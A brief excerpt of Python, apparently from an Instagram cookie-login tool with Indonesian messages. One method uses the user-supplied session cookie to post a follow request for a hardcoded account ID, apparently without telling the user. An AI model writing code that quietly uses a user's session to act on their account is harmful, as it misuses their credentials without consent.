  ...
  #      self.loadCookie(Instagram)
    ...
    def cook(self, tok, cok):
        try:
            ...
            self.ses.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("58612083547"), headers = head, cookies={"cookie":cok})
        except requests.ConnectionError:
            self.logoo()
            print(f" {H}•{N} {M}Koneksi Internet Anda Bermasalah")
            time.sleep(3);exit()
